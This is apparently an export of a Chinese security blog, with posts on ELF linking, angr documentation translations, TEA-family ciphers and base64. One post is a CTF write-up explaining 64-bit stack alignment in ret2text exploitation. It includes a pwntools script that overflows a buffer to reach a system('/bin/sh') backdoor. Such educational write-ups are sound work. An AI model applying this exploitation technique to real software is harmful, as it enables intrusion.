0000000000000013 0000000000000001 MS 0 0 1 [ 7] .note.GNU-stack PROGBITS 0000000000000000 000000be 0000000000000000 0000000000000000 0 0 1 [ 8] .note.gnu.pr[...] NOTE 0000000000000000 000000c0 0000000000000030 0000000000000000 A 0 0 8 [ 9] .eh_frame PROGBITS 0000000000000000 000000f0 0000000000000058 0000000000000000 A 0 0 8 [10] .rela.eh_frame RELA 0000000000000000 00000280 0000000000000030 0000000000000018 I 11 9 8 [11] .symtab SYMTAB 0000000000000000 00000148 00000000000000c0 0000000000000018 12 4 8 [12] .strtab STRTAB 0000000000000000 00000208 0000000000000015 0000000000000000 0 0 1 [13] .shstrtab STRTAB 0000000000000000 000002b0 0000000000000074 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) .text：存放编译好的机器指令\n.data：存放已初始化的全局变量和静态变量\n.bss：未初始化的全局变量和静态变量和被初始化为0的全局和静态变量，仅在section table中标记占用总空间，不占据实际空间，程序运行时自动在内存中分配这些变量，并赋0\n.rodata：存放只读数据\n.comment：存放编译器版本信息\n.symtab：Symbol Table 符号表\n.rel.text：Relocation Table 重定位表\n.debug：调试信息\n.line：原始C程序中的行号和.text section中机器指令之间的映射\n.strtab：String Table 字符串表，与.symtab相比主要用于调试时而不是运行\n.shstrtab：section header的字符串表\n.eh_frame：gcc处理异常时关于栈展开的记录，参考阅读\n静态链接 静态库文件 一般后缀为.a，一种称为archive的特殊文件格式（类似压缩包），是一组可重定位目标文件的集合，如libc.a。可使用ar命令解压所有的可重定位目标文件到当前目录\nar -x /usr/lib/libc.a 手动构建静态库 # 使用gcc只编译汇编不链接 gcc -c main.c -o main.o # 使用ar打包成archive文件，可指定多个.o文件（可重定向目标文件） ar rcs libmain.a main.o 使用指定静态库链接 # 使用gcc静态链接使用指定静态库，后可跟多个，默认添加libc.a gcc --static -o main main.o ./libmain.a 符号解析 链接器在链接过程中维护了三个集合：E、U、D，分别是最终使用的可重定位目标文件、引用了但尚未定义的符号、已定义的符号，三个集合初始均为空。\n链接开始，链接器从左至右扫描命令行参数，发现可重定位目标文件，就放入集合E，将已定义的符号加入D中，将为定义的符号加入U中。\n发现静态库文件，就尝试对库中每一个可重定向目标文件寻找U中未定义的符号，如果找到，则将这个文件加入集合E，相应删除这个文件中包含的U中未定义的符号。将D中没有的、该文件中定义的其他符号加入D中。逐个扫描静态库中的每个可重定向目标文件，如果U中没有对应的为定义的符号，则该文件被丢弃。\n所有文件扫描结束后，如果U是空的，则链接器会合并E中的可重定向目标文件来生成可执行文件。如果U非空，则链接器会输出一个错误而中止。\n重定位 符号解析完成后，连接器会合并各输入模块，为每个符号分配运行时地址\n重定位节和符号定义 链接器将多个可重定向目标文件中相同的section合成一个新的section，并为每条指令和全局变量分配运行时地址\n重定位节中的符号引用 汇编器在生成可重定位目标文件时，并不知道数据和代码最终放在内存的什么地方，也不知道该模块外引用的外部定义的函数以及全局变量的位置。所以当遇到不确定的符号引用时，汇编器就会生成一个重定向条目，并将不确定的引用地址填0占位。\n重定向条目告诉链接器在合成可重定位目标文件时应该如何修改这个引用，.text节的重定位条目放在.rel.text中。\n// 重定位条目的结构 typedef struct { long offset; //被修改的引用的节偏移量 long type:32, // 重定位类型l symbol:32; //表示被修改的引用是一个符号 long addend; //常数，一些使用进行偏移调整 }ELF64_Rela 重定位类型常见的有：重定位绝对引用和重定位相对引用，不详细叙述。\n动态链接 共享库文件 是一种特殊的可重定向目标文件，linux系统中使用.so后缀，windows系统中使用.dll后缀。动态链接中使用的库文件。在程序鱼形过程中，能被加载到内存的任意地址，还能与一个内存中的程序链接起来。\n构造共享库 gcc --shared -fpic -o libmain.so main.c # fpic：生成位置无关代码 使用指定共享库链接 gcc -o main main.c ./libmain.so 链接器此时并未将libmin.so中的代码和数据复制到可执行文件中，只是复制了一些符号表和重定位信息\n当main程序被加载运行时，加载器会发现可执行程序中存在一个名为.interp的节，这个节中包含了动态链接器的路径名，实际上这个连接器也是一个共享目标文件（ld-linux.so）。接下来，加载器会将这个动态链接器加载到内存中运行，然后由动态链接器执行重定位代码和数据的工作。\n重定位之后，动态链接器把控制权限交给可执行程序。从这以后，共享库的位置就固定了，在程序执行过程中都不会改变\n在运行时加载共享库 linux系统为动态链接器提供了接口，可以使程序在运行时加载和链接共享库，可使用dlopen、dlsym函数加载，使用dlclose函数卸载。这里不细说了。\n","id":12,"section":"posts","summary":"C源代码到可执行文件 回顾一下从源代码到可执行文件的基本过程 预处理（pre-processor) 作用：删除注释、文件包含、文本替换、展开宏定义","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"https://blog.dx39061.top/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/","year":"2022"},{"content":"Top Level Interface 开始之前（Before You Start） 我们预期的angr主要的应用场景是Ipython（或者其他python命令行解释器）。当你不确定可以用什么接口时，tab键的 补全往往能帮助到你。\n有时Ipython中的tab补全会很慢。我们发现以下解决方法很有效且不会影响补全功能的完整性：\n# 将此文件放在Ipython配置文件的启动目录中可以避免每次都单独1运行它 import IPython py = IPython.get_ipython() py.Completer.use_jedi = False 核心概念（Core Concepts） 在开始使用angr之前，你将会对angr的基本概念和如何构造一个angr对象有一个基本的概览。我们将通过二进制程序加载后直接可用的接口来说明这些概念。\n你使用angr做的第一件事往往是把二进制程序加载到工程中，我们以/bin/true为例\n\u0026gt;\u0026gt;\u0026gt; import angr \u0026gt;\u0026gt;\u0026gt; proj = angr.Project('/bin/true') 在angr中，一个project是你所能控制的基本单元，通过project，你将能对刚刚加载的二进制程序进行分析和模拟。几乎你在angr项目中使用的每一个对象都依赖于某种形式的project而存在\n基本属性（Basic properties） 首先，project有一些基本属性：它的CPU架构，它的文件名和程序入口点。\n\u0026gt;\u0026gt;\u0026gt; import monkeyhex # 用来将数字结果转化为16进制 \u0026gt;\u0026gt;\u0026gt; proj.arch \u0026lt;Arch AMD64(LE)\u0026gt; \u0026gt;\u0026gt;\u0026gt; proj.entry 0x401670 \u0026gt;\u0026gt;\u0026gt; proj.filename '/bin/true' arch是archinfo.Arch对象的实例，用来指明程序编译的架构，在这个例子中是little-endian amd64。它包含许多它所运行的CPU的信息，你可以在闲暇时细读。通常情况下你所关心的是arch.bits，arch.bytes（这个是main Arch class 的@property声明），arch.name和arch.memory_endness\nentrry是二进制程序的入口点\nfilename显然是二进制程序的文件名\n加载器（The loader） 从一个二进制程序到它在虚拟地址空间的映射是十分复杂的！我们有一个叫CLE(Christophe\u0026rsquo;s Loader for Everything) 的模块去解决这个问题。CLE就是一种加载器，可以通过.loader属性调用。我们将在后面详细了解如何使用它，但现在你只需知道你可以用它查看angr随着你的程序加载的动态链接库（shared libraries）并且执行一些对于他们地址空间的基本的查询\n\u0026gt;\u0026gt;\u0026gt; proj.loader \u0026lt;loaded true, maps [0x400000:0x5004000]\u0026gt; \u0026gt;\u0026gt;\u0026gt; proj.loader.shared_objects # 或许和你的看起来有点不一样 {'ld-linux-x86-64.so.2': \u0026lt;ELF Object ld-2.24.so, maps [0x2000000:0x2227167]\u0026gt;, 'libc.so.6': \u0026lt;ELF Object libc-2.24.so, maps [0x1000000:0x13c699f]\u0026gt;} \u0026gt;\u0026gt;\u0026gt; proj.loader.min_addr 0x400000 \u0026gt;\u0026gt;\u0026gt; proj.loader.max_addr 0x5004000 \u0026gt;\u0026gt;\u0026gt; proj.loader.main_object # 我们已经在项目中加载了几个二进制程序。这里是主要的一个 \u0026lt;ELF Object true, maps [0x400000:0x60721f]\u0026gt; \u0026gt;\u0026gt;\u0026gt; proj.loader.main_object.execstack # 查询示例：是否存在可执行栈段 False \u0026gt;\u0026gt;\u0026gt; proj.loader.main_object.pic # 查询示例：这个二进制程序是地址无关代码吗？ # pic(position-independent code)指可在主存储器中任意位置正确执行，而不受其绝对地址影响的一种机器码，常用于动态链接库 工厂（The Factory） 在angr中有许多类，而它们中的大多数需要一个project去把他们实例化。我们并不会让你到处传递project，而是提供了project.factory，其中包含了一些你会频繁使用到的、常见对象的构造器。\n本节还将介绍angr的一些基本概念。\n块（Blocks） 首先，我们有project.factory.block()，常常用来从给定地址提取基本代码块。这是一个重要的事实——angr以块为基本单位分析代码。你会得到一个block对象，其中包含了许多关于这个代码块的有趣的东西\n\u0026gt;\u0026gt;\u0026gt; block = proj.factory.block(proj.entry) # 从程序的入口点取出一个代码块 \u0026lt;Block for 0x401670, 42 bytes\u0026gt; \u0026gt;\u0026gt;\u0026gt; block.pp() # pretty-print 向stdout输出相应反汇编代码 0x401670: xor ebp, ebp 0x401672: mov r9, rdx 0x401675: pop rsi 0x401676: mov rdx, rsp 0x401679: and rsp, 0xfffffffffffffff0 0x40167d: push rax 0x40167e: push rsp 0x40167f: lea r8, [rip + 0x2e2a] 0x401686: lea rcx, [rip + 0x2db3] 0x40168d: lea rdi, [rip - 0xd4] 0x401694: call qword ptr [rip + 0x205866] \u0026gt;\u0026gt;\u0026gt; block.instructions # 在这个代码块中共有多少条指令？ 0xb \u0026gt;\u0026gt;\u0026gt; block.instruction_addrs # 这个代码块中指令的地址分别是多少？ [0x401670, 0x401672, 0x401675, 0x401676, 0x401679, 0x40167d, 0x40167e, 0x40167f, 0x401686, 0x40168d, 0x401694] 更多的，你可以使用block对象获得块代码的其他表示形式\n\u0026gt;\u0026gt;\u0026gt; block.capstone # capstone disassembly \u0026lt;CapstoneBlock for 0x401670\u0026gt; \u0026gt;\u0026gt;\u0026gt; block.vex # VEX IRSB (这是python内部地址，而不是程序内部地址) \u0026lt;pyvex.block.IRSB at 0x7706330\u0026gt; 状态（states） 关于angr的另一个事实是——project对象仅仅相当于程序的一个“初始化镜像”。当你使用angr执行运行程序时，你正在使用一个模拟程序运行状态的对象-SimState。比如：\n\u0026gt;\u0026gt;\u0026gt; state = proj.factory.entry_state() \u0026lt;SimState @ 0x401670\u0026gt; 一个SimState记录着一个程序的内存、寄存器、文件信息\u0026hellip;任何可以通过程序执行更改的“实时数据”健康都会被存储进去。稍后我们将会介绍如何与这些状态交互，但是现在，让我们用state.regs和state.mem来查看当前状态下的寄存器和内存\n\u0026gt;\u0026gt;\u0026gt; state.regs.rip # 取得当前指令的地址 \u0026lt;BV64 0x401670\u0026gt; \u0026gt;\u0026gt;\u0026gt; state.regs.rax \u0026lt;BV64 0x1c\u0026gt; \u0026gt;\u0026gt;\u0026gt; state.mem[proj.etry].int.resolved # 将入口点的内存以C语言中int类型显示 \u0026lt;BV32 0x8949ed31\u0026gt; 这些并不是python的ints！这些是bitvectors。python中的integers与CPU层面的字（words）并不是一个概念，例如python不会产生整数溢出。所以我们使用bitvectors，可以将其视为一串bits构成的整数，angr中用它来代表CPU data。注意每个bitvector都有一个.length属性来描述它是多少bits宽\n我们在后面将会学习如何使用它们，但是现在，我们列出了如何将数字在python int和bitvector之间转换的方法\n\u0026gt;\u0026gt;\u0026gt; bv = state.solver.BVV(0x1234, 32) # 创建一个32bit宽的bitvector,它的值是0x1234 \u0026lt;BV32 0x1234\u0026gt; # BVV：bitvector value \u0026gt;\u0026gt;\u0026gt; state.solver.eval(bv) # 将bitvector转化为python int 0 你可以把bitvector存回寄存器和内存，或者直接存储python integer类型值，它会被自动转化成合适大小的bitvector\n\u0026gt;\u0026gt;\u0026gt; state.regs.rsi = state.solver.BVV(3, 64) \u0026gt;\u0026gt;\u0026gt; state.regs.rsi \u0026lt;BV64 0x3\u0026gt; \u0026gt;\u0026gt;\u0026gt; state.mem[0x1000].long = 4 \u0026gt;\u0026gt;\u0026gt; state.mem[0x1000].long.resolved \u0026lt;BV64 0x4\u0026gt; mem接口刚开始看令人困惑，因为它使用了一些强大的python魔法，下面是简要的使用指南：\n使用array[index]来指明确定的地址\n用.\u0026lt;type\u0026gt;来指定内存数据的类型（常用类型：char, short, int, long, size_t, uint8_t, uint16_t\u0026hellip;)\n通过mem接口你可以：\n存储一个值到内存，既可以是bitvector,也可以是python int\n用.resolve来获取内存值并转化为bitvector\n用.concrete来获取内存值并转化为python int\n还有更多高级用法将在后面提到\n最终，如果你尝试读取更多寄存器的值，你可能会遇到一个长得十分奇怪的值\n\u0026gt;\u0026gt;\u0026gt; state.regs.rdi \u0026lt;BV64 reg_48_11_64{UNINITIALIZED}\u0026gt; 这同样是一个64位bitvector，但是它并没有携带数值，相反的，它有一个名字！它被称为符号变量，也是符号执行的基础。不要恐慌！我们会在两章之后讨论它的细节\n模拟管理器（Simulation Managers） 如果程序在任意给定的时间点都有一个状态，那么必然有一种方法可以让它变成下一种状态。simulation manager是angr执行中的主要接口。模拟（simulation）无论你如何叫它，它都是带有状态的。作为一个简短的介绍，让我们看看如何在我们之前创建的代码块中标记状态。\n首先，我们要创建一个simulation manager，构造函数可以传入一个状态或状态列表\n\u0026gt;\u0026gt;\u0026gt; simgr = proj.factory.simulation_manager(state) \u0026lt;SimulationManager with 1 active\u0026gt; \u0026gt;\u0026gt;\u0026gt; simgr.active [\u0026lt;SimState @ 0x401670\u0026gt;] 一个simulation manager可以有多种状态的封装（stash），默认的stash是active，用我们传入的状态初始化。如果还不够的话，我们可以查看simgr.active[0]来进一步了解各种状态\n现在， 准备好，我们要进行一些程序的执行了。\n\u0026gt;\u0026gt;\u0026gt; simgr.step() 我们刚刚进行了一个基本快的符号执行！\n我们可以再看看active stash，注意它已经被更新了，并且它并没有改变我们原来的状态。SimState对象在执行时被视为不可变，所以你可以安全地将单个状态作为多轮执行的开始（base）\n\u0026gt;\u0026gt;\u0026gt; simgr.active [\u0026lt;SimState @ 0x1020300\u0026gt;] \u0026gt;\u0026gt;\u0026gt; simgr.active[0].regs.rip # new and exciting! \u0026lt;BV64 0x1020300\u0026gt; \u0026gt;\u0026gt;\u0026gt; state.regs.rip # still the same! \u0026lt;BV64 0x401670\u0026gt; /bin/true不是一个很好的例子来描述如何用符号执行做有趣的事，所以我们现在就到此为止\n分析（Analyse） angr预先打包了一些内置分析方法，你可以利用它们从程序中提取一些有趣的信息。\n\u0026gt;\u0026gt;\u0026gt; proj.analyses. # 在这里按tab来列出所有内置的分析方法 proj.analyses.BackwardSlice proj.analyses.CongruencyCheck proj.analyses.reload_analyses proj.analyses.BinaryOptimizer proj.analyses.DDG proj.analyses.StaticHooker proj.analyses.BinDiff proj.analyses.DFG proj.analyses.VariableRecovery proj.analyses.BoyScout proj.analyses.Disassembly proj.analyses.VariableRecoveryFast proj.analyses.CDG proj.analyses.GirlScout proj.analyses.Veritesting proj.analyses.CFG proj.analyses.Identifier proj.analyses.VFG proj.analyses.CFGEmulated proj.analyses.LoopFinder proj.analyses.VSA_DDG proj.analyses.CFGFast proj.analyses.Reassembler 本手册后面会记录其中的一些方法，但总的来说，如果你想要找到如何使用内置的分析方法，你应该查看api文档。作为一个简短的例子：下面说明了你应该怎样生成并使用一个快速的程序控制流图：\n# 刚开始时，当我们加载二进制文件时，它还将其所有依赖项加载到同一块虚拟内存中 # 这对于大多数分析是不愿意看到的 \u0026gt;\u0026gt;\u0026gt; proj = angr.Project('/bin/true', auto_load_libs=False) \u0026gt;\u0026gt;\u0026gt; cfg = proj.analyses.CFGFast() \u0026lt;CFGFast Analysis Result at 0x2d85130\u0026gt; # cfg.graph 是一个充满了CFGNode实例的 networkx DiGraph # 你应该去看 networkx APIs 的文档去学习如何使用它 \u0026gt;\u0026gt;\u0026gt; cfg.graph \u0026lt;networkx.classes.digraph.DiGraph at 0x2da43a0\u0026gt; \u0026gt;\u0026gt;\u0026gt; len(cfg.graph.nodes()) 951 # 去获取指定地址的 CFGNode， 可以用 cfg.get_any_node \u0026gt;\u0026gt;\u0026gt; entry_node = cfg.get_any_node(proj.entry) \u0026gt;\u0026gt;\u0026gt; len(list(cfg.graph.successors(entry_node))) 2 Now what？ 阅读完这一页之后，你应该熟悉了angr几个重要概念：basic blocks, states, bitvectors, simulation managers 和analyses。但是除了把angr作为美化的调试器以外，你还不能做任何事情。继续阅读，你将解锁更深层次的力量\u0026hellip;\n","id":13,"section":"posts","summary":"Top Level Interface 开始之前（Before You Start） 我们预期的angr主要的应用场景是Ipython（或者其他python命令行解释器）。当你不确定可","tags":["reverse","angr"],"title":"angr文档翻译（二）Top Level Interface","uri":"https://blog.dx39061.top/2022/09/top_level_interface/","year":"2022"},{"content":"README angr是一个多架构二进制分析工具包，能够实现对二进制程序的动态符号执行（像Mayhem, KLEE, 等等）和各种静态分析。如果你想要学习如何使用angr, 那么你就来对地方了。\n我们努力使您更加轻松地使用angr——我们的目标是创造一个对使用者友好的二进制分析套件，让用户简单地使用ipython运行一些指令，就能分析密密麻麻的二进制程序。话虽如此，但二进制分析是十分复杂的，angr也不得不显得复杂。本文档将努力帮你走出困境，为你提供一些angr设计原则的解释和可能的探索\n要进行二进制分析，我们必须解决以下问题：\n将二进制程序转换为中间语言（intermediate representation）\n执行确切的分析，可能的步骤有：\n部分或完整程序的静态分析（如依赖分析、程序切片分析等）\n对程序执行状态的符号化探索（如“我们可以执行程序直到找到溢出点吗？”）\n上面两者的结合（如“让我们只执行程序写入内存的片段，去找到一个溢出点”）\nangr的组件可以应对以上所有的问题。这本手册将会解释每一个组件是如何工作的，以及如何使用他们来达成你的目标\n","id":14,"section":"posts","summary":"README angr是一个多架构二进制分析工具包，能够实现对二进制程序的动态符号执行（像Mayhem, KLEE, 等等）和各种静态分析。如果你想要学习如何使用a","tags":["reverse","angr"],"title":"angr文档翻译（一）README","uri":"https://blog.dx39061.top/2022/09/readme/","year":"2022"},{"content":"起 以一道简单的pwn题说明，题目参见BUU-rip\n查看保护信息，啥都没开，amd64 ❯ checksec ./pwn1 [*] '/home/dx3906/CTF/problem/pwn/buu/rip/pwn1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 运行 ❯ ./pwn1 please input abc abc ok,bye!!! 拖入ida // main int __cdecl main(int argc, const char **argv, const char **envp) { char s[15]; // [rsp+1h] [rbp-Fh] BYREF puts(\u0026quot;please input\u0026quot;); gets((__int64)s, (__int64)argv); puts(s); puts(\u0026quot;ok,bye!!!\u0026quot;); return 0; } // backdoor int fun() { return system(\u0026quot;/bin/sh\u0026quot;); } // fun 汇编 .text:0000000000401186 fun proc near .text:0000000000401186 ; __unwind { .text:0000000000401186 push rbp .text:0000000000401187 mov rbp, rsp .text:000000000040118A lea rdi, command ; \u0026quot;/bin/sh\u0026quot; .text:0000000000401191 call _system ; Call Procedure .text:0000000000401196 nop ; No Operation .text:0000000000401197 pop rbp .text:0000000000401198 retn ; Return Near from Procedure .text:0000000000401198 ; } // starts at 401186 .text:0000000000401198 fun endp 所以解题思路就是通过main的gets函数进行栈溢出，覆盖返回地址，跳转到fun执行得到shell\n由此得到exp\nfrom pwn import * context(log_level=\u0026quot;debug\u0026quot;, arch=\u0026quot;amd64\u0026quot;, os=\u0026quot;linux\u0026quot;) p = process(\u0026quot;./pwn1\u0026quot;) payload = b'a'*23 + p64(0x401186) p.sendlineafter(b\u0026quot;please input\\n\u0026quot;,payload) p.interactive() 但是get shell失败\n承 于是去百度了一下，发现各种wp的payload中间多塞了一个地址0x401198，即payload = b'a'*23 + p64(0x401198) + p64(0x401186)，试了一下确实可行\n文章原因说是为了恢复堆栈平衡，什么是堆栈平衡呢？\n我理解的是：在函数调用结束之后，将堆栈恢复到调用之前的样子，从汇编层面来说就是复原esp与ebp\n但payload里加了0x401198这个地址只是多执行了一条retn，最多也只是让esp+4之类的，这就能控制堆栈平衡了？我百思不得其解\n转 拿gdb attach上去调发现了问题，跳转fun调用system函数时包括传参都是正常的，但会断在这一行汇编上\n0x7fad5eadef43 movaps xmmword ptr [rsp + 0x50], xmm0 ; 报错 ; Program received signal SIGSEGV, Segmentation fault. 在执行glibc中的system系统调用时，很可能会用到movaps指令\nmovaps：在两个XMM寄存器或XMM寄存器与内存之间移动四个单精度浮点值。要求如果涉及内存，则内存地址必须按16字节对齐，即16进制表示的地址最后一位必须是0\n此处可打印rsp+0x50发现确实不符合要求\npwndbg\u0026gt; p $rsp+0x50 $1 = (void *) 0x7fffd26e4508 需要rsp+0x50按16字节对齐，更进一步来说，就是要rsp寄存器指向的地址按16字节对齐，而能够使rsp寄存器变化的无非call、retn、push、pop这些指令。\n实际上，程序在正常运行情况下，编译器能保证编译出来的这些指令有序运作，当需要进行system调用时，一定是16字节对齐，使用movaps指令不会产生错误\n只有程序堆栈被非正常地修改，程序进行非预期行为时，才可能会出现无法对齐的情况，从而引发Segmentation fault，使程序异常退出\n再深入去想，由于是64位程序，所以rsp每次的变化要么是rsp-=8,要么是rsp+=8，故rsp所指地址最后一位其实只有两个取值，0或8，为0时堆栈对齐，为8时会引发错误\n在进行ret2text时，我们覆盖了函数返回地址，程序本该返回至调用处，却进入了一个新的函数。\n在此之前，rsp指向的地址一直是正常的，与程序正常执行无异的，但新函数第一句要执行压栈命令push rbp，此时rsp-=8，于是rsp最后一位变成了8，进行system调用时发生错误\n那么如何避免错误呢？\n显而易见的，我们需要修改rsp寄存器的值，无论是加8还是减8，但同时必须合理利用返回地址才能进行跳转。于是，retn成为了一个很好的选择，我们可以提前布栈，先压入一个retn指令的地址，再压入后门函数的地址\n程序首先执行retn指令即pop rip使rsp+8，此时紧随其后后门函数的地址赋值给rip，下一步进入后门函数，当执行push rbp时rsp-8，此时rsp最后一位变回0，程序正常执行\n换一种思路？\n既然我们知道了是多了一句push rbp出了问题，那我们是不是可以跳过这一句呢？答案是肯定的，我们可以直接把返回地址改为system调用之前传参的地址，即payload = b'a'*23 + p64(0x40118A)，一样可以get shell\n合 64位程序ret2text失败简单以没有平衡堆栈来解释是极不负责的做法\n平衡堆栈是指在函数调用结束后，将堆栈恢复到原来的状态。\n但我们在利用栈溢出漏洞进行攻击时，并不关心函数调用结束后的状态。只是需要在系统调用之前保证堆栈对齐即可\nRef https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call\nhttps://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/\nhttps://ropemporium.com/guide.html\n以上，如有疏漏请师傅们指出\n","id":15,"section":"posts","summary":"起 以一道简单的pwn题说明，题目参见BUU-rip 查看保护信息，啥都没开，amd64 ❯ checksec ./pwn1 [*] '/home/dx3906/CTF/problem/pwn/buu/rip/pwn1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 运行 ❯","tags":["pwn"],"title":"堆栈对齐——关于64位程序ret2text失败的溯源","uri":"https://blog.dx39061.top/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/","year":"2022"},{"content":"TEA 算法简介 TEA：微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。\n块密码：在密码学中，分组加密（英语：Block cipher），又称分块加密或块密码，是一种对称密钥算法。它将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。\n算法属性 TEA操作处理两个32位无符号整型上（可能源于一个64位数据）\nTEA使用一个128位密钥\n算法过程 - TEA遵循Feistel网络 Feistel网络构造细节：\n令F为轮函数，并令$K_0,K_1,……K_n$分别为0,1,……n的子密钥\n将明文拆分为两个等长的块，$(L_0,R_0)$\n对每轮$i=0,1……n$，计算\n$L_{i+1}=R_i$\n$R_{i+1}=L_i \\bigoplus F(R_i,K_i)$\n则密文为$(R_{n+1},L_{n+1})$\n加解密过程唯一区别是子密钥顺序反转\n- TEA实现过程 C语言实现 #include \u0026lt;stdint.h\u0026gt; void encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i \u0026lt; 32; i++) { /* basic cycle start */ sum += delta; v0 += ((v1\u0026lt;\u0026lt;4) + k0) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k1); v1 += ((v0\u0026lt;\u0026lt;4) + k2) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k3); } /* end cycle */ v[0]=v0; v[1]=v1; } void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i\u0026lt;32; i++) { /* basic cycle start */ v1 -= ((v0\u0026lt;\u0026lt;4) + k2) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k3); v0 -= ((v1\u0026lt;\u0026lt;4) + k0) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; } 逆向算法特征 delta的值0x9e3779b9，且有sum在每一轮逐次累加，但delta数值容易被魔改\n加密轮次一般为32轮，且每轮加密都是对两个32位数据进行\n\u0026lt;\u0026lt;4与\u0026gt;\u0026gt;5及其加密逻辑一般是最重要的突破口\nXTEA #include \u0026lt;stdint.h\u0026gt; /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i \u0026lt; num_rounds; i++) { v0 += (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); sum += delta; v1 += (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); } v[0]=v0; v[1]=v1; } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i \u0026lt; num_rounds; i++) { v1 -= (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); sum -= delta; v0 -= (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); } v[0]=v0; v[1]=v1; } XXTEA #define MX ((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2) + (y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4) ^ (sum^y) + (k[p\u0026amp;3^e]^z)) long btea(long* v, long n, long* k) { unsigned long z=v[n-1], y=v[0], sum=0, e, DELTA=0x9e3779b9; long p, q ; if (n \u0026gt; 1) { /* Coding Part */ q = 6 + 52/n; while (q-- \u0026gt; 0) { sum += DELTA; e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=0; p\u0026lt;n-1; p++) y = v[p+1], z = v[p] += MX; y = v[0]; z = v[n-1] += MX; } return 0 ; } else if (n \u0026lt; -1) { /* Decoding Part */ n = -n; q = 6 + 52/n; sum = q*DELTA ; while (sum != 0) { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=n-1; p\u0026gt;0; p--) z = v[p-1], y = v[p] -= MX; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } return 0; } return 1; } ","id":16,"section":"posts","summary":"TEA 算法简介 TEA：微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。 块密码：在","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"https://blog.dx39061.top/2022/07/tea/","year":"2022"},{"content":"base64编码 编码原理 Base64是一种基于64个可打印字符来表示二进制数据的表示方法 由于$\\log_{2}{64}=6$，所以每6个比特为一个单元，对应一个可打印字符。3个字节即24个比特，对应4个Base64单元，故4个可打印字符表示3个字节的信息 如果被编码的字节数不能被3整除（多出1个或2个字节），那么先在末尾补1个或2个字节的0值，使其能够被3整除。然后进行base64编码，末尾每有6比特0值就在base64编码文本后加有一个‘’=‘’号 编码过程 定义base64编码对应表\n计算编码后的文本长度\n3个字节对应4个Base64单元进行编码\n如果需要则补‘’=‘‘\nC语言实现 unsigned char* base64_encode(unsigned char* str) { // 1. define the base64 table unsigned char table[] = \u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026quot;; // 2. calculate the length of string after base64 encoding int str_len = strlen(str); int len; if (str_len % 3 == 0) { len = str_len / 3 * 4; } else { len = (str_len/3 + 1) * 4; } // 3. Encoding as a group of three 8-bit characters unsigned char *res = malloc(sizeof(unsigned char) * len + 1); res[len] = '\\0'; int i, j; for(i=0, j=0; j\u0026lt;str_len; j+=3, i+=4) { res[i] = table[str[j] \u0026gt;\u0026gt; 2]; res[i+1] = table[(str[j]\u0026amp;0b11) \u0026lt;\u0026lt; 4 | str[j+1] \u0026gt;\u0026gt; 4]; res[i+2] = table[(str[j+1]\u0026amp;0b1111) \u0026lt;\u0026lt; 2 | str[j+2] \u0026gt;\u0026gt; 6]; res[i+3] = table[str[j+2]\u0026amp;0b111111]; } 